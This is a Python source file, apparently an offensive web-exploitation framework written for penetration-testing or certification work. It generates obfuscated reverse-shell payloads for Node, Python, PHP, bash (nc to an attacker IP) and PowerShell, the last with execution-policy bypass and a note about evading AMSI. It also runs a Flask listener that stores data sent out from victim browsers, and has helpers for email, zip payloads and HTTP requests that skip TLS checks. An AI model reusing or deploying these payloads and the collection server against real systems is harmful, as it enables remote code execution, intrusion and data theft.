
  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386
387
388
389
390
391
392
393
394
395
396
397
# -*- coding: utf-8 -*-
# "They laugh at me because I'm different. I laugh at them because they're all the same"

from colorama import init, Fore, Back, Style
import hashlib
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os.path
import subprocess
import zipfile
import io
from flask import Flask, request                                                      
import threading
import sqlite3
import base64
import binascii
import urllib.parse
import json
import re
import smtplib
from flask_cors import CORS
import netifaces


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#       Web Exploitation Framework
#     coded by highjack (OSID-13120)


class generateshell:
    def customize_shell(self, base_shell, ip, cmd, port, lang):
        custom_shell = base_shell.replace("$$ip$$", ip)
        custom_shell = custom_shell.replace("$$cmd$$", cmd)
        custom_shell = custom_shell.replace("$$port$$", port)
        if lang == "node" or lang == "python2" or lang == "python3":
            custom_shell_bytes = custom_shell.encode('ascii')
            custom_shell = binascii.hexlify(custom_shell_bytes)
        elif lang == "php" or lang == "bash":
            custom_shell_bytes = custom_shell.encode('ascii')
            custom_shell = base64.b64encode(custom_shell_bytes)
        elif lang == "powershell":
            #encoding from here: https://byt3bl33d3r.github.io/converting-commands-to-powershell-compatible-encoded-strings-for-dummies.html
            custom_shell_bytes = custom_shell.encode('UTF-16LE')
            custom_shell = base64.b64encode(custom_shell_bytes)
        else:
            print("unsupported language")
            exit()
        
        #if the shell is in byte form, decode it as a string
        if type(custom_shell) is bytes:
            custom_shell = custom_shell.decode('utf-8')
        return custom_shell

    def node(self, ip, port, cmd):
        #original shell from here: https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
        base_shell = """(function(){
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("$$cmd$$", []);
        var client = new net.Socket();
        client.connect($$port$$, "$$ip$$", function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /a/; 
    })();"""
        custom_shell = self.customize_shell(base_shell, ip, cmd, port, "node")
        payload = "eval(new Buffer('{}', 'hex').toString());".format(custom_shell)
        return payload

    def python(self, ip, port, cmd, version):
        #original shell from here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
        base_shell = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$$ip$$\",$$port$$));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"$$cmd$$\")"
        custom_shell = self.customize_shell(base_shell, ip, cmd, port, version)

        if version == "python2":
            payload = "import codecs; exec(codecs.decode('{}','hex'))".format(custom_shell)
        else:
            payload = "import binascii; exec(binascii.unhexlify('{}'))".format(custom_shell)
        return payload

    def php(self, ip, port, cmd):
        #original shell from: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php
        base_shell = "$sock=fsockopen(\"$$ip$$\",$$port$$);exec(\"$$cmd$$ -i <&3 >&3 2>&3\");"
        custom_shell = self.customize_shell(base_shell, ip, cmd, port, "php")
        payload = "eval(base64_decode('{}'));".format(custom_shell)
        return payload

    def bash(self, ip, port, cmd):
        #original shell from: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd
        base_shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|$$cmd$$ -i 2>&1|nc $$ip$$ $$port$$ >/tmp/f"
        custom_shell = self.customize_shell(base_shell, ip, cmd, port, "bash")
        payload = "echo {} | base64 -d | sh".format(custom_shell)
        return payload


    def powershell(self, ip, port):
        #TODO: bypass AMSI
        #original shell from: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
        base_shell = "$client = New-Object System.Net.Sockets.TCPClient('$$ip$$',$$port$$);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        custom_shell = self.customize_shell(base_shell, ip, "", port, "powershell")
        payload = "powershell.exe -exec bypass -enc  {}".format(custom_shell)
        return payload

class webpwn:
    proxy_enabled = False
    interface = ""
    proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080',}
    debug_enabled = False
    app = Flask(__name__)
    CORS(app)
    
    @app.route("/get")
    def get_value():
        name = request.args.get('name')
        con = sqlite3.connect('./data/webpwn.db3')
        sql = "SELECT name, value, ref from logs where name=? order by id desc limit 1"
       
        cur = con.cursor()
        cur.execute(sql, (name,))
        rows = cur.fetchall()
        json_output = ""
        for row in rows:
            name, value, ref = row
            json_output = {"name":name, "value":value, "ref":ref}
        return  json.dumps(json_output)

    @app.route("/helpers.js")
    def helpers_js():
        js = """function request(method, url, headers, data, callback){
        var xhttp = new XMLHttpRequest();

        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                response  = this.responseText;
                callback(response)
                }
        };

        if (method == "POST")
        {
            xhttp.open("POST", url, true);
        }
        else
        {
            xhttp.open("GET",url)
        }
        if (method == "POST")
        {
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        }
    
        if (headers != "")
        {
            for (var key in headers)
            {
                var value = headers[key];
                xhttp.setRequestHeader(key, value);
            }
        }

        if (method == "POST")
        {
            xhttp.send(data);
        }
        else
        {
            xhttp.send()
        }

    }

    function get_url()
    {
        var full_url = window.location.href;
        var array = full_url.split("/");
        var url = array[0]+"//"+array[2];
        return url;
    }


    function get_data(name)
    {
        request
    }

    function set_data(name, value, method, headers)
    {

    }
    """
        return js

    @app.route("/set")
    def set_value():
        con = sqlite3.connect('./data/webpwn.db3')
        sql = "INSERT INTO logs (name, value, ref) VALUES (?, ?, ?)"
        ref = request.headers.get("Referer")
        name = request.args.get('name')
        value = request.args.get('value')
        cur = con.cursor()
        cur.execute(sql, (name, value, ref))    
        con.commit()
        return "{}:{} added to database".format(name, value)

    def get_ip(self):
        self.status("Using interface: {}".format(self.interface))
        interface_settings = netifaces.ifaddresses(self.interface)
        ip = interface_settings[netifaces.AF_INET][0]['addr']
        return ip


        

    def __init__(self, exploit_name, author, date, proxy_enabled=False, debug_enabled=False, interface=None):
        self.exploit_name = exploit_name
        self.author = author
        self.date = date
        self.proxy_enabled = proxy_enabled
        self.debug_enabled = debug_enabled
        self.interface = interface
        self.banner(self.exploit_name, self.author, self.date)
    
    def error(self, message):
        print("[❌] {}".format(message))
        exit()
    def status(self, message):
        print("[❕] {}".format(message))
    def success(self, message):
        print("[✔️} {}".format(message))
    def debug(self, message):
            if self.debug_enabled == True:
                print("[🐞] {}".format(message))

    def banner(self, exploit_name, author, date):
        logo = """██╗    ██╗███████╗██████╗ ██████╗ ██╗    ██╗███╗   ██╗
██║    ██║██╔════╝██╔══██╗██╔══██╗██║    ██║████╗  ██║
██║ █╗ ██║█████╗  ██████╔╝██████╔╝██║ █╗ ██║██╔██╗ ██║
██║███╗██║██╔══╝  ██╔══██╗██╔═══╝ ██║███╗██║██║╚██╗██║
╚███╔███╔╝███████╗██████╔╝██║     ╚███╔███╔╝██║ ╚████║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝"""
        print("{}{}".format(Fore.RED,logo))
        print("{}[- Exploit -]: {}{}".format(Fore.BLUE,Fore.CYAN,exploit_name))
        print("{}[- Date -]: {}{}".format(Fore.BLUE, Fore.CYAN, date))
        print("{}[- Author -]: {}{}{}".format(Fore.BLUE, Fore.CYAN, author, Style.RESET_ALL))
        self.debug("[+] Proxy Enabled: {}".format(str(self.proxy_enabled)))
    
    def create_basic_auth(self, username, password):
        basic_auth =  self.encode(username+":"+password, "base64")
        basic_auth = "Basic " + basic_auth
        headers = {"Authorization" : basic_auth}
        return headers


    def send_email(self, to_address, from_address, subject, smtp_server, body, date):
        message_body = "From: {}\n".format(from_address)
        message_body += "To {}\n".format(to_address)
        message_body += "Date: {}\n".format(date)
        message_body += "Subject: {}\n".format(subject)
        message_body += "Content-type: text/html\n\n"
        message_body += "{}\r\n\r\n".format(body)
        server = smtplib.SMTP(smtp_server)
        try:
            server.sendmail(from_address, to_address, message_body)
            self.status("Email sent successfully to {}".format(to_address))
        except Exception as e:
            self.error("Unable to send email to {}".format(to_address))


    def find(self, regex, input):
        pattern = "(?P<match>{})".format(regex)
        result = ""
        match = re.search(pattern, input)
        if match:
            result = match.group()
            return result
        else:
            self.error("Could not find match \"{}\"".format(regex))
    
    def bytes2string(self, input):
        if type(input) is bytes:
            output = input.decode('utf-8')
        else:
            output = input
        return output

    def decode(self, input, encoding):
        if encoding == "hex":
            output = bytes.fromhex(input).decode('utf-8')
        elif encoding == "base64":
            #input_bytes = input.encode('ascii')
            output = base64.b64decode(input)     
        elif encoding == "url":
            output = urllib.parse.unquote(input)
        else:
            self.error("encoding type not supported")
        output = self.bytes2string(output)
        return output


    def encode(self, input, encoding):
        if encoding == "hex":
            input = input.encode('ascii')
            output = binascii.hexlify(input)
        elif encoding == "base64":
            input_bytes = input.encode('ascii')
            output = base64.b64encode(input_bytes)     
        elif encoding == "url":
            output = urllib.parse.quote(input)
        else:
            self.error("encoding type not supported")
        output = self.bytes2string(output)
        return output
    
    def build_zip(self, zip_dict, output_file_name):
        if zip_dict != None or output_file_name != None:
            f = io.BytesIO(b"")
            z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
            for key in zip_dict.keys():
                file_name = key
                contents = zip_dict[file_name]
                z.writestr(file_name, contents)

            z.close()
            zip = open(output_file_name,'wb')
            zip.write(f.getvalue())
            zip.close()
        else:
            self.error("Dictionary of zip items or the filename was not provided")


   
    def hash(self, method, input):
        m = ""
        if method == "sha512":
            m = hashlib.sha512()
        elif method == "sha1":
            m = hashlib.sha1()
        elif method == "md5":
            m = hashlib.md5()
        elif method == "sha256":
            m = hashlib.sha256()
        else:
            return ""
        m.update(input.encode('ascii'))
        return m.hexdigest()

    def run_command(self, command):
        array_command = command.split(" ")
        process = subprocess.Popen(array_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        process.wait()
        stdout = stdout.decode('ascii')
        stderr = stderr.decode('ascii')
        return stdout, stderr

    def webserver(self, static_folder, port):
        self.status("Starting Flask Server...")
        threading.Thread(target=self.app.run(host="0.0.0.0")).start()
        

    
    def request(self, method, url, data=None, session=None, cookies=None, headers=None, useragent=None, redirects=True, file_path=None, file_parameter=None):
        method = method.upper()
        if self.proxy_enabled == False:
            proxies = None
        else:
            proxies = self.proxies
        if useragent != None:
            useragent_dict = {"User-Agent":useragent}
            if headers != None:
                headers.update(useragent_dict)
            else:
                headers= useragent_dict

        if session==None:
            session = requests.Session()

        if method == "GET":
            r = session.get(url, cookies=cookies, headers=headers, proxies=proxies, verify=False, allow_redirects=redirects)
        elif method == "POST":
            r = session.post(url, data=data, cookies=cookies, headers=headers, proxies=proxies, verify=False, allow_redirects=redirects)
        elif method == "UPLOAD":
            if file_path != None and file_parameter != None:
                if os.path.isfile(file_path):
                    filehandle = open(file_path, "rb")
                    file_parameter = {file_parameter: filehandle}
                    r = session.post(url, data=data, cookies=cookies, headers=headers, proxies=proxies, verify=False, allow_redirects=redirects, files=file_parameter)
                else:
                    self.error("Local file \"{}\" does not exist".format(file_path))
            else:
                self.error("filepath and file_parameter not set")

        response = r.text
        return response, session
